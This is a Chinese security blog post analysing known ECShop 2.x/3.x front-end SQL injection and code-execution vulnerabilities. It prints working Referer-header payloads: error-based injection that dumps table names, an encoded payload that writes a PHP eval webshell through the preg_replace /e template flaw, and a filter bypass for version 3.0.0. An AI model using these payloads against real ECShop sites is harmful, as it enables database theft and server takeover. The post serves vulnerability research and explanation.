<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="人若无名，方可潜心练剑"><meta name="keywords" content><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>七月火 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">人若无名，方可潜心练剑</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">173</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">59</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="http://www.lsafe.org">离心</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a></div></div></div><nav id="nav" style="background-image: url(/img/backgroud.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a></span></div><div id="site-info"><div id="site-title">Mochazz's blog</div><div id="site-sub-title">七月火</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2018/09/10/关于ECShop前台注入和getshell漏洞的一些思考/">关于ECShop前台注入和getshell漏洞的一些思考</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-10</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/代码审计/">代码审计</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ECShop/">ECShop</a></span><div class="content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近爆出的ECShop的两个漏洞很火，本篇文章就网络上爆出的payload进行分析，并记录其中自己的一些思考，具体的漏洞不会详细分析，因为这类分析文章已经有很多了，如果你想了解，可以看结尾处的相关文章。</p>
<h3 id="ECShop2-x"><a href="#ECShop2-x" class="headerlink" title="ECShop2.x"></a>ECShop2.x</h3><p>下面以2.7.3版本为例，我们先来看网络上最早爆出来 <strong>注入的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;&#125;</span><br></pre></td></tr></table></figure>

<p>这个payload还原回去，对应的SQL语句如下：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/1.png" alt="1"></p>
<p>然而这种payload有点鸡肋，因为在版本稍微高一点的mysql中， <strong>procedure analyse</strong> 语句中不能再跟 <strong>select</strong> 语句。看 <strong>P牛</strong> 转载的 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">这篇</a>文章中，mysql版本为 <strong>5.5.41-0ubuntu0.14.04.1</strong> ，是可以跟 <strong>select</strong> 语句的：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/2.png" alt="2"></p>
<p>而我用 <strong>phpstudy</strong> 中mysql版本为 <strong>5.5.53</strong> ，使用该语句却爆语法错误：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/3.png" alt="3"></p>
<p>所以猜测应该是和版本有关，或者说 <strong>procedure analyse</strong> 语句还有其他的注入写法，知道的师傅还请告诉我：)</p>
<p>既然这种 <strong>payload</strong> 不能爆出表名、列名，我们就要换个思路。仔细观察 <strong>ECShop</strong> 存在注入处的源码，实际上可控制的拼接参数有两个，分别是： <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> ，所以我们大可在 <strong>$arr[‘id’]</strong> 处注入 <strong>payload</strong> (这里直接用 <strong>#</strong> 号)，直接注释掉后面的 <strong>ORDER BY</strong> 语句。</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/4.png" alt="4"></p>
<p>所以我构造的 <strong>payload</strong> 如下，可以成功爆出表名和列名：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:3:"669";s:2:"id";s:133:"1' and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#";&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/5.png" alt="5"></p>
<p>当然，同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，引入 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句注释掉也是可以的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:2:"id";s:4:"' /*";s:3:"num";s:132:"*/ and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)";&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/6.png" alt="6"></p>
<p>再来看 <strong>命令执行的payload</strong> ：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>

<p>当中的16进制对应字符串如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asd<span class="string">'];assert(base64_decode('</span>ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp<span class="string">'));//&#125;xxx</span></span><br></pre></td></tr></table></figure>

<p>这个命令执行的关键点，还是利用了之前的注入点，同样引入了 <strong>/**/</strong> 将 <strong>ORDER BY</strong> 语句给注释掉。当中，payload会经过 <strong>includes/cls_template.php</strong> 文件的这条语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br></pre></td></tr></table></figure>

<p>这里的 <strong>preg_replace</strong> 使用了危险的 <strong>/e</strong> 模式，而第二个参数中的 <strong>\1</strong> 实际表示的是下图绿色部分字符串：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/7.png" alt="7"></p>
<p>对于正则中的 <strong>\1</strong> 不熟悉的话，可以参考 <a href="https://mochazz.github.io/2018/08/13/深入研究preg_replace与代码执行/">这篇</a> 文章。之后程序的流程就如下调用：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/8.png" alt="8"></p>
<p>我们可以思考一下这处的命令执行，能不能像前面一样，只利用 <strong>$arr[‘id’]</strong> 位置（即引入单个 <strong>#</strong> 号）？实际上是不行的，必须两个可控变量同时配合利用，才能完成攻击。因为在 <strong>includes/lib_insert.php</strong> 文件中有一个判断，如果数据库查询出的 <strong>position_id</strong> 和用户传入的 <strong>id</strong> 相同，才会执行 <strong>fetch</strong> 函数，继而进入 <strong>includes/cls_template.php</strong> 文件的 <strong>_eval</strong> 方法，达到代码执行的目的。</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/9.png" alt="9"></p>
<p>我们试着使用前面我构造的 <strong>payload</strong> （只利用 <strong>$arr[‘id’]</strong> 引入单个 <strong>#</strong> 号），此时 <strong>$arr[‘id’]</strong> 对应下图黄框部分，而 <strong>$row[‘position_id’]</strong> 对应红框部分，要让这两个地方相等，根本不可能。</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/10.png" alt="10"></p>
<p>仔细观察，会发现 <strong>$row[‘position_id’] ** 和 **$arr[‘id’]</strong> 之间使用的是弱比较，那我们是否能利用PHP弱比较的特性绕过呢？实际上还是不行，因为 *<em>$row[‘position_id’] *</em> 是从数据库中查询出来的，其值类型为字符串，所以无法相等。</p>
<p>最终payload传到 <strong>_eval</strong> 函数中，成功执行代码：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/11.png" alt="11"></p>
<h3 id="ECShop3-x"><a href="#ECShop3-x" class="headerlink" title="ECShop3.x"></a>ECShop3.x</h3><p>下面以3.0.0版本为例。在ECShop3.x版本中，添加了一个 <strong>includes/safety.php</strong> 文件，专门用于消除有害数据，但是漏洞依旧存在，我们只需绕过过滤函数即可。该文件代码如下：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/12.png" alt="12"></p>
<p>用我们之前的payload，会触发过滤SQL注入的正则，具体匹配到的子项如下的 <strong>$ttt</strong> 变量：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/13.png" alt="13"></p>
<p>主要这个正则会匹配到 <strong>set</strong> 、 <strong>concat</strong> 、<strong>information_schema.</strong>、 <strong>select from</strong> 语句等，暂时没有找到可绕过的SQL语句。</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/14.png" alt="14"></p>
<p>不过命令执行还是可以绕过的，因为我们之前的payload经过编码，这样就绕过了正则匹配。现在唯一能匹配到的就是 <strong>union select</strong> 语句，我们可以同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，将 <strong>union</strong> 和 <strong>select</strong> 分开传递即可绕过正则检测：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/15.png" alt="15"></p>
<p>但是这里还会匹配到 <strong>select from</strong> 语句，这里没有绕过，所以爆不了表名列名。</p>
<p><strong>3.x</strong> 版本除了多了这处正则，<strong>includes/cls_template.php</strong> 文件中的 <strong>fetch_str</strong> 方法结尾处也不一样了，多了一个 <strong>if</strong> 结构，满足条件才能继续命令执行。下图左边为 <strong>ECShop2.7.3</strong> ，右边为 <strong>ECShop3.0.0</strong> ：</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/16.png" alt="16"></p>
<p>按照默认的数据传递流程，<strong>version_compare</strong> 函数默认是存在的，所以要想进入 <strong>if</strong> 语句，必须让后面的条件为真。后面的条件要求我们PHP的版本需要小于 <strong>5.3.0</strong> 才会进入该 <strong>if</strong> 语句。在实际测试时，我在 <strong>PHP5.2.17</strong> 版本下利用如下payload确实可以成功写入webshell，但是PHP版本大于等于 <strong>5.3.0</strong> 就无法写入webshell。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";s:286:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:9:"' union/*";&#125;45ea207d7a2b68c49582d2d22adf953aadsa</span><br></pre></td></tr></table></figure>

<p>实际上ECShop在3.6的版本中已经修复了该漏洞，而 <a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">这篇</a> 文章中所说的3.6.x也存在，我看了他的测试代码，发现他把原先ECShop中的修复代码给注释掉了，这样当然可以利用漏洞了！标题有点误导性。</p>
<p><img src="/img/%E5%85%B3%E4%BA%8EECShop%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%92%8Cgetshell%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/30.png" alt="30"></p>
<p>本文分析到此结束，文中若有不当，还望大家斧正，若有绕过姿势愿意分享，也可以联系我。</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a><br><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">ECShop 0day 的堕落之路</a><br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a><br><a href="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/" target="_blank" rel="noopener">ECShop sqli and rce</a><br><a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">ECShop &lt;= 2.7.x/3.6.x 全系列版本远程代码执行高危漏洞EXP</a><br><a href="http://www.freebuf.com/vuls/183294.html" target="_blank" rel="noopener">ECShop 2.x 3.0代码执行漏洞分析</a> </p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/82/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/82/">82</a><span class="page-number current">83</span><a class="page-number" href="/page/84/">84</a><span class="space">&hellip;</span><a class="page-number" href="/page/173/">173</a><a class="extend next" rel="next" href="/page/84/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>